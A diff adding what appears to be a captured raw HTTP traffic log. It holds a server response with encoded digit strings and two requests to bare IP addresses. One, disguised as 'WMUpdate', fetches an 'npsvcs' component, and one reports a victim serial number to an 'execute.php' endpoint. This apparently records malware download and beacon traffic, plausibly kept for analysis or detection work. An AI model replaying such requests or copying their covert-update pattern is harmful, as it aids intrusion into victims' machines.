@@ -1,0 +1,30 @@
+HTTP/1.1 200 OK
+Date: Fri, 25 Feb 2011 20:09:47 GMT
+Server: Apache/2.0.52 (CentOS)
+Last-Modified: Fri, 25 Feb 2011 09:05:39 GMT
+ETag: "cb372-127-49d17a243bec0"
+Accept-Ranges: bytes
+Content-Length: 295
+Connection: close
+Content-Type: text/plain
+
+032183095029110096022122191076035
+063053228095212232225026252237073056050207088
+
+036088051014052170092221070025005081194073
+036088051014061144022158108005
+036088051014061139178106036199023006
+036088051014000068066155061130011125121
+036088051014004241117020200083002009198043186219153169
+GET /setup/npsvcs/npsvcs.svcn HTTP/1.1
+User-Agent: WMUpdate
+Host: 220.90.213.158
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+GET /logdata/execute.php?m_origin=ADDNISUE&usr_id=AD&usr_gubun=E&serialno=MDkxMTA4MDcyNzA0MTgzODE2&Pid=npsvcs HTTP/1.1
+Content-Type: text/html
+Host: 221.143.48.236
+Accept: text/html, */*
+User-Agent: Mozilla/3.0 (compatible; Internet Explorer)
+
